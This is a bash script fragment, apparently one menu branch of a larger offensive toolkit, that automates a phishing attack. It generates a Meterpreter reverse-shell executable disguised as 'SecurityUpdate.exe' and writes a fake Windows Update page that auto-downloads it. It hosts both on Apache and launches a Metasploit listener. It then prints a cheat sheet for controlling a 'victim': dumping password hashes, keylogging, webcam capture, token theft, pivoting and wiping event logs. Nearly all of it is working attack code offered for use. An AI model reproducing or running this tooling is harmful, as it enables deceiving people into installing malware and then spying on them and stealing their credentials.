#!/bin/bash
# ==========================================
# الألوان (Standard Colors)
# ==========================================
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
FRED='\033[38;2;195;17;12m'
RESET='\033[0m'

# ---------------------------------------------------
# Social Engineering Banner
# ---------------------------------------------------
show_se_banner() {
    clear
    # ASCII Art for SOCIAL ENGINEERING (Block Style)
    echo -e "${FRED}"
    echo -e " ██████  ██████  ██████ ██  █████  ██       ███████ ███    ██  ██████  ██ ███    ██ ███████ ███████ ██████  ██ ███    ██  ██████  "
    echo -e " ██     ██    ██ ██     ██ ██   ██ ██       ██      ████   ██ ██       ██ ████   ██ ██      ██      ██   ██ ██ ████   ██ ██       "
    echo -e " ██████ ██    ██ ██     ██ ███████ ██       █████   ██ ██  ██ ██   ███ ██ ██ ██  ██ █████   █████   ██████  ██ ██ ██  ██ ██   ███ "
    echo -e "     ██ ██    ██ ██     ██ ██   ██ ██       ██      ██  ██ ██ ██    ██ ██ ██  ██ ██ ██      ██      ██   ██ ██ ██  ██ ██ ██    ██ "
    echo -e " ██████  ██████  ██████ ██ ██   ██ ███████  ███████ ██   ████  ██████  ██ ██   ████ ███████ ███████ ██   ██ ██ ██   ████  ██████  "
    echo -e "${RESET}"
}

show_se_baner() { 
    echo -e "${RED}><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<<<<><<<<><<<<<<<><<><<<<><<<<><<<<><<<<><<<<><<<<><<<<${RESET}"
    echo -e "${WHITE}                                                 Social Engineering Mode                  ${RESET}"
    echo -e "${RED}><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<><<<<<<<><<<<><<<<<<<><<<><<<<<<<><<<<><<<<<<<><<><<<<><<<<${RESET}\n"
}
                clear
                show_se_banner
                echo -e "${RED}=================================================================================================================================${RESET}"
                echo -e "${RED}                                        Social Engineering: Automated Phishing & Delivery               ${RESET}"
                echo -e "${RED}=================================================================================================================================${NC}"
                echo -e ""
                
                while true; do
                    read -e -p "$(echo -e ${WHITE}'Enter your Kali IP (LHOST): '${RESET})" lhost
                    
                    # 1. التأكد من الفورمات (Regex Check)
                    if [[ ! $lhost =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
                        echo -e "${RED}[!] Invalid IP Format. Please try again.${RESET}"
                        continue
                    fi

                    # 2. التأكد هل الـ IP متاح (Reachability Check)
                    echo -e "${YELLOW}[*] Checking if $lhost is live...${RESET}"
                    if ping -c 1 -W 2 "$lhost" > /dev/null 2>&1; then
                        echo -e "${GREEN}[+] IP is reachable.${RESET}"
                        break
                    else
                        echo -e "${RED}[!] Target IP ($lhost) is unreachable.${RESET}"
                        read -p "Do you want to use it anyway? (y/n): " force_use
                        [[ "$force_use" == "y" || "$force_use" == "Y" ]] && break
                    fi
                done
                
                read -e -p "$(echo -e ${WHITE}'Enter Port (LPORT) [Default 4444]: '${RESET})" lport
                lport=${lport:-4444}
                output_file="SecurityUpdate.exe"
                web_dir="/var/www/html"

                echo -e "${YELLOW}[*] Step 1: Generating Malicious Payload...${NC}"
                msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $output_file &> /dev/null
                
                echo -e "${YELLOW}[*] Step 2: Creating Automated Phishing Page...${NC}"
                cat <<EOF > index.html
        <!DOCTYPE html>
        <html>
        <head>
            <title>Windows Update Center</title>
            <style>
            body { font-family: sans-serif; background-color: #f0f0f0; text-align: center; padding: 50px; }
            .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); display: inline-block; }
            h1 { color: #cc0000; }
            </style>
            <script>
            window.onload = function() {
                alert("CRITICAL SECURITY RISK DETECTED!\n\nYour system is vulnerable to remote attacks. Please download and install the mandatory security patch immediately.");
                window.location.href = "$output_file";
            };
            </script>
        </head>
        <body>
            <div class="box">
            <h1>Critical System Update</h1>
            <p>Your Windows XP system is missing essential security updates.</p>
            <p>Click <a href="$output_file">here</a> if the download didn't start automatically.</p>
            </div>
        </body>
        </html>
EOF

                echo -e "${YELLOW}[*] Step 3: Hosting Files on Apache Server...${NC}"
                sudo mv $output_file $web_dir/
                sudo mv index.html $web_dir/
                sudo chmod 755 $web_dir/$output_file
                sudo service apache2 restart &> /dev/null

                echo -e "${YELLOW}[*] Step 4: Configuring Automated Multi-Handler...${NC}"
                echo "use exploit/multi/handler" > auto_phish.rc
                echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> auto_phish.rc
                echo "set LHOST $lhost" >> auto_phish.rc
                echo "set LPORT $lport" >> auto_phish.rc
                echo "set ExitOnSession false" >> auto_phish.rc
                echo "set AutoRunScript post/windows/manage/migrate" >> auto_phish.rc
                echo "exploit -j" >> auto_phish.rc
                
                echo -e "\n${BLUE}========================================================================${NC}"
                echo -e "${YELLOW}[!] ULTIMATE POST-EXPLOITATION CHEAT SHEET (Read before victim clicks!)${NC}"
                echo -e "${BLUE}========================================================================${NC}"
                echo -e "When the victim downloads and runs the file, Metasploit will output:"
                echo -e "${GREEN}[*] Meterpreter session X opened...${NC}\n"
                
                echo -e "${CYAN}1. CONNECT & ESCALATE:${NC}"
                echo -e "   • ${WHITE}sessions -i 1${NC} : Connect to the target (Replace '1' with your session ID)."
                echo -e "   • ${WHITE}migrate <PID>${NC} : Move your payload into a stealthy process (like explorer.exe)."
                
                echo -e "\n${CYAN}2. SYSTEM ENUMERATION & CREDENTIALS:${NC}"
                echo -e "   • ${WHITE}sysinfo${NC}       : Displays OS, architecture, and system details."
                echo -e "   • ${WHITE}getuid${NC}        : Shows your current user privileges."
                echo -e "   • ${WHITE}hashdump${NC}      : Dumps SAM password hashes (Requires SYSTEM)."
                echo -e "   • ${WHITE}ps${NC}            : Lists all running processes on the target."
                
                echo -e "\n${CYAN}3. SURVEILLANCE & SPYING:${NC}"
                echo -e "   • ${WHITE}screenshot${NC}    : Captures a silent picture of the victim's desktop."
                echo -e "   • ${WHITE}screenshare${NC}   : Streams the victim's desktop in real-time to your browser."
                echo -e "   • ${WHITE}keyscan_start${NC} : Begins logging all keyboard typing."
                echo -e "   • ${WHITE}keyscan_dump${NC}  : Displays the captured keystrokes."
                echo -e "   • ${WHITE}webcam_list${NC}   : Lists connected webcams."
                echo -e "   • ${WHITE}webcam_snap${NC}   : Takes a stealthy picture from the webcam."
                
                echo -e "\n${CYAN}4. NETWORK & PIVOTING:${NC}"
                echo -e "   • ${WHITE}arp${NC}           : Displays the host's ARP cache to find other local machines."
                echo -e "   • ${WHITE}netstat${NC}       : Displays active network connections."
                echo -e "   • ${WHITE}portfwd add -l 3389 -p 3389 -r <Target_IP>${NC} : Tunnels traffic through the victim."
                
                echo -e "\n${CYAN}5. ADVANCED TOKEN MANIPULATION:${NC}"
                echo -e "   • ${WHITE}load incognito${NC}        : Loads the token stealing module."
                echo -e "   • ${WHITE}list_tokens -u${NC}        : Lists all available user delegation tokens."
              
                echo -e "\n${CYAN}6. HARDWARE, OPSEC & CONTROL:${NC}"
                echo -e "   • ${WHITE}shell${NC}                  : Drops you into a standard Windows CMD (C:\\>)."
                echo -e "   • ${WHITE}uictl disable keyboard${NC} : Disables the victim's physical keyboard."
                echo -e "   • ${WHITE}clearev${NC}                : Wipes the Windows Event Logs (Application, System, Security)."
                
                echo -e "\n${RED}[!] INCIDENT RESPONSE (IR) OPSEC WARNING:${NC}"
                echo -e "    'clearev', 'hashdump', and token impersonation are highly volatile."
                echo -e "    These actions generate massive telemetry spikes in SOC monitoring"
                echo -e "    tools (EDR/SIEM) and are critical indicators of compromise (IoC)."
                echo -e "${BLUE}========================================================================${NC}\n"
                
                echo -e "${GREEN}[+] Everything is Automated and Ready!${NC}"
                echo -e "${CYAN}[!] Tell the victim to open: http://$lhost/${NC}"
                
                read -e -p "Press Enter to launch Metasploit and wait for the victim..."
                
                msfconsole -q -r auto_phish.rc
                rm -f auto_phish.rc
                continue
                ;;
